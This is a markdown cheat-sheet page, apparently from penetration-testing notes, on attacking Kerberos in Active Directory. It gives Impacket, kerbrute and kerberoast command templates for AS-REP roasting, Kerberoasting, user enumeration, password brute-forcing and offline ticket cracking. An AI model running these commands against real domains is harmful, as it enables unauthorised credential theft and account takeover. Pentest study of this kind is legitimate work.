# TCP 88: Kerberos

> Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))</cite>

## Related

* [Active Directoy](../03-misc/Active-Directoy.md)
* [TCP 389, 636, 3268, 3269: LDAP](TCP-389-636-3268-3269-LDAP.md)
* [Impacket](../../13-misc/impacket.md)
* [GitHub: TarlogicSecurity/kerberos_attacks_cheatsheet.md](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

## AS-REP Roasting

If Kerberos preauthentication is disabled for a user, the Key Distribution Center (KDC) just issues a Ticket Granting Ticket (TGT) for any user we request (AS_REQ).  
Part of the reply (AS_REP) is encryted using the users password, and can then be cracked offline.  

See also [YouTube - Conda - Attacking Active Directory - AS-REP Roasting](https://www.youtube.com/watch?v=EVdwnBFtUtQ).  

### Requirements  

* Only works on user accounts that have Kerberos preauthentication disabled
* List of potential usernames (may be queried from LDAP using a domain account)

### Impacket 

```bash
GetNPUsers.py <domain>/<username> -dc-ip <ip>
```

### Rubeus

TODO

### kerbrute

A tool to perform Kerberos pre-auth bruteforcing  
[GitHub - ropnop/kerbrute](https://github.com/ropnop/kerbrute)

Enumerate users
```bash
./kerbrute_linux_386 userenum -d <domain> --dc <domaincontroller> <usernames.txt>
```

bruteforce password of one user
```bash
./kerbrute_linux_386 bruteuser -d <domain> --dc <domaincontroller> <password-list> <username@domain>
```

## Kerberoasting

If we have access to any user account on the domain, we can request (TGS_REQ) Ticket Granting Service (TGS) tickets for any service account (using SPN).  
The reply (TGS_REP) contains the TGS, encrypted with the service accounts password, that can then be cracked offline.  

See also [YouTube - Conda - Attacking Active Directory - Kerberoasting](https://www.youtube.com/watch?v=-3MxoxdzFNI)  

### Requirements

* Only works on service accounts that have a Service Principal Name (SPN) set
* Creds/User account on the domain (low priv is sufficient)

### Impacket

```bash
GetUserSPNs <domain>/<username> -dc-ip <ip> -request
```

### Rubeus

TODO

### kerberoast

```bash
sudo apt install kerberoast
```

Use exported tickets from [Mimikatz](../../04-privilege-escalation/02-windows/02-mimikatz.md)
```bash
python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <exported-tickets-file>
```

## Sync time

It's necessary to sync the client time to the domain controller.  

**Error** (when not synced)  
> SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  

### ntpdate

```bash
ntpdate <dc-ip>
```

### Manually

**Get server time**
```bash
nmap -sC -sV <ip>
```

```
Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-20T00:14:12
|_  start_date: N/A
```

**Set local time accordingly**
```bash
date -s "20 Mar 2020 00:14:12+00:00"
```
